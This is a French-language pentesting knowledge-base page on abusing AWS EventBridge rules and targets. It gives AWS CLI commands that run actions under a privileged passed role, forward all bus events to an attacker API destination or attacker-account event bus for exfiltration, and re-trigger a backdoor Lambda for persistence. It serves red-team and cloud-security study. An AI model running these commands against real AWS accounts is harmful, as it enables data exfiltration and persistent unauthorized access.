---
title: "EventBridge : déclencher des actions sous un rôle cible"
order: 6
description: "Détourner les règles, bus et cibles EventBridge pour déclencher des actions ou exfiltrer des événements sous un rôle privilégié."
keywords:
  - EventBridge
  - règle
  - bus d'événements
  - cible
  - rôle
---

# EventBridge

EventBridge achemine les événements des bus vers des **cibles** (Lambda, Step Functions, SNS, destinations d'API et autres services), et une cible peut porter un `RoleArn` sous lequel s'exécute la livraison. Avec `events:PutRule` et `events:PutTargets` (plus `iam:PassRole`), un attaquant peut planifier ou déclencher des actions en tant que rôle transmis, ajouter une cible qui transfère chaque événement d'un bus vers une destination d'API contrôlée par l'attaquant à des fins d'exfiltration, ou modifier une politique de bus inter-comptes pour injecter des événements.

## Planifier une action sous un rôle transmis

```bash
aws events put-rule --name x --schedule-expression 'rate(5 minutes)'
aws events put-targets --rule x --targets \
  'Id=1,Arn=<target-arn>,RoleArn=arn:aws:iam::<acct>:role/<privileged-role>,Input="{}"'
```

## Exfiltrer un bus vers une destination d'API

```bash
aws events put-rule --name exfil --event-pattern '{"source":[{"prefix":""}]}'
aws events put-targets --rule exfil --targets \
  'Id=1,Arn=<api-destination-arn>,RoleArn=<role>'
```

## Réagir aux événements à des fins de persistance

Pointez une règle vers une [backdoor](code-and-layers.md) Lambda pour qu'un appel d'API choisi rétablisse l'accès : une règle qui correspond à `iam:CreateUser` ou à une connexion à la console réinvoque la fonction chaque fois que cet événement survient, un schéma que les modules `lambda__backdoor_new_*` de Pacu automatisent.

```bash
aws events put-rule --name react --event-pattern \
  '{"source":["aws.iam"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventName":["CreateUser"]}}'
aws events put-targets --rule react --targets "Id=1,Arn=<backdoor-fn-arn>"
```

Une cible peut aussi être un **bus d'événements dans un autre compte**, de sorte qu'une règle de transfert expédie les événements correspondants directement vers une infrastructure contrôlée par l'attaquant :

```bash
aws events put-targets --rule exfil --targets \
  'Id=1,Arn=arn:aws:events:<region>:<attacker-acct>:event-bus/default,RoleArn=<role>'
```

## Notes d'exploitation

- Une règle dotée d'un `--event-pattern` large correspond à presque tous les événements du bus, ce qui transforme une cible de transfert en un canal d'exfiltration d'événements durable.
- Les cibles dotées d'un `RoleArn` exigent `iam:PassRole` : il s'agit donc à la fois d'un chemin PassRole et d'un mécanisme de persistance (la règle continue de se déclencher selon la planification).
- Une politique de ressource de bus trop permissive autorise `events:PutEvents` depuis un autre compte, ce qui permet d'injecter des événements pour déclencher des automatisations en aval.

## Outils

- **AWS CLI** (`events put-rule`, `put-targets`, `put-permission`) : règles, cibles et politique de bus.

## Références

- [AWS : cibles de règle EventBridge](https://docs.aws.amazon.com/eventbridge/latest/userguide/eb-targets.html)
- [HackTricks Cloud : AWS EventBridge](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
- [Rhino Security Labs : élévation de privilèges AWS](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [Stratus Red Team : techniques AWS](https://stratus-red-team.cloud/attack-techniques/AWS/)
